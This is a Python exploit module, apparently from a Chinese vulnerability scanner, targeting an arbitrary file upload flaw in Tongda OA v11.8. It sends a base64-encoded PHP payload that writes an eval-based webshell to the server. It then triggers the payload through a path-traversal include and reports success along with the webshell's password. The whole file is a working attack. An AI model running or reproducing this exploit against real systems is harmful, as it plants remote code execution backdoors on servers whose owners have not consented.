import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import time

data = time.localtime()
year = time.strftime('%y',data)
mone = time.strftime('%m',data)

def 通达OA_v11_8_api_任意文件上传(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding":"gzip",
        "Content-Type":"multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae"
        }
    headerx = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
    data='''--502f67681799b07e4de6b503655f5cae
Content-Disposition: form-data; name="file"; filename="fb6790f4.json"
Content-Type: application/octet-stream
 
{"modular":"AllVariable","a":"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIGV2YWwoJF9SRVFVRVNUWydhXSk7Pz4nKTs=","dataAnalysis":"{\"a\":\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\"}"}
--502f67681799b07e4de6b503655f5cae--'''
    data=data.encode("utf-8").decode("latin1")
    upload_url=urldata+'mobile/api/api.ali.php'
    exp_url=urldata+'inc/package/work.php?id=../../../../../myoa/attach/approve_center/{}/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4'.format(year+mone)
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(upload_url, headers=headers, data=data, verify=False)
        if upload.status_code == 200:
            exp_request = requests.get(url=exp_url,headers=headers,verify=False)
            if 'OK' in exp_request.text and exp_request.status_code == 200: 
                print(Vcolors.RED + "[+] 漏洞存在上传webshell成功，请修改日期 包含并生成文件默认密码为a:{}".format(exp_url) +Vcolors.ENDC)
            else:
                print(Vcolors.WARNING + "[x] 通达OA v11.8 api.ali.php 任意文件上传漏洞不存在" +Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 通达OA v11.8 api.ali.php 任意文件上传漏洞不存在" +Vcolors.ENDC)
    except:
        logging.error("通达OA_v11_8_api_任意文件上传脚本出现异常")


